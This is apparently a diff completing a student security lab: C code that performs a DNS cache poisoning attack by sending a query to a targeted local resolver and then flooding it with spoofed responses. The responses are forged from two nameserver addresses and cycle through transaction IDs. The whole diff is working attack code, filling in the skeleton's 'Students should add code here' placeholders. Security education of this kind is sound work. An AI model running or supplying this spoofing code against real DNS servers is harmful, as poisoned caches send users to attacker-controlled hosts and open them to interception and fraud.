@@ -25,12 +25,13 @@ struct ipheader {
 };
 
 void send_raw_packet(char * buffer, int pkt_size);
-void send_dns_request( );
-void send_dns_response( );
+void send_dns_request(unsigned char* packet, int pktsize, char* name);
+void send_dns_response(unsigned char* packet, int pktsize, unsigned char* src, char* name, unsigned short id);
 
 int main()
 {
   srand(time(NULL));
+  unsigned short txn = 0;
 
   // Load the DNS request packet from file
   FILE * f_req = fopen("ip_req.bin", "rb");
@@ -60,14 +61,16 @@ int main()
     //##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server.
                This will trigger the DNS server to send out DNS queries */
-
-    // ... Students should add code here.
+    send_dns_request(ip_req, n_req, name);
 
 
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
-    
-    // ... Students should add code here.
+    for (int i = 0; i < 500; i++) {
+      send_dns_response(ip_resp, n_resp, "199.43.135.53", name, txn);
+      send_dns_response(ip_resp, n_resp, "199.43.133.53", name, txn);
+      txn += 1;
+    }
     
     //##################################################################
   }
@@ -77,18 +80,26 @@ int main()
 /* Use for sending DNS request.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_request()
+void send_dns_request(unsigned char* packet, int pktsize, char* name)
 {
-  // Students need to implement this function
+  memcpy(packet + 41, name, 5);
+  send_raw_packet(packet, pktsize);
 }
 
 
 /* Use for sending forged DNS response.
  * Add arguments to the function definition if needed.
  * */
-void send_dns_response()
+void send_dns_response(unsigned char* packet, int pktsize, unsigned char* src, char* name, unsigned short id)
 {
-  // Students need to implement this function
+  int ip = (int)inet_addr(src);
+  memcpy(packet + 12, (void*)&ip, 4);
+  memcpy(packet + 41, name, 5);
+  memcpy(packet + 64, name, 5);
+
+  unsigned short txn = htons(id);
+  memcpy(packet + 28, (void*)&txn, 2);
+  send_raw_packet(packet, pktsize);
 }
 
 
